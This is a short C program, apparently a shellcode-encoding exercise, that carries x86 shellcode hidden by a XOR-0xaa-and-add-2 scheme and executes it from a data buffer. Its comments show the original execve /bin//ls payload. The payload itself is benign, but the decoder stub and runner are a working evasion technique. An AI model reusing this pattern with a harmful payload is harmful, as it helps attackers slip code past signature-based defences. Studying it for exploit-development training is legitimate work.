#include<stdio.h>
#include<string.h>

unsigned char codedb[] = \
"\xeb\x1b\x5e\x89\xf7\x89\xf3\x80\x36\xaa\x74\x03\x46\x75\xf8\x31\xc9\xb1\x1f\x89\xde\x80\x2f\x02\x47\xe2\xfa\xff\xe6\xe8\xe0\xff\xff\xff\x99\x68\xf8\xc0\xce\xc9\xdf\xc0\xc0\xce\xc1\xda\x9b\xc0\x9b\x9b\x9b\x9b\x21\x4f\xf8\x21\x4e\xff\x21\x49\x18\xa7\x65\x28\xaa";


void main()
{

	printf("Shellcode Length:  %d\n", strlen(codedb));

	int (*ret)() = (int(*)())codedb;

	ret();

}


//	\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80    Orginal

//	\x33\xc2\x52\x6a\x31\x31\x6e\x75\x6a\x31\x64\x6b\x70\x8b\xe5\x52\x8b\xe4\x55\x8b\xe3\xb2\x0d\xcf\x82	add 2
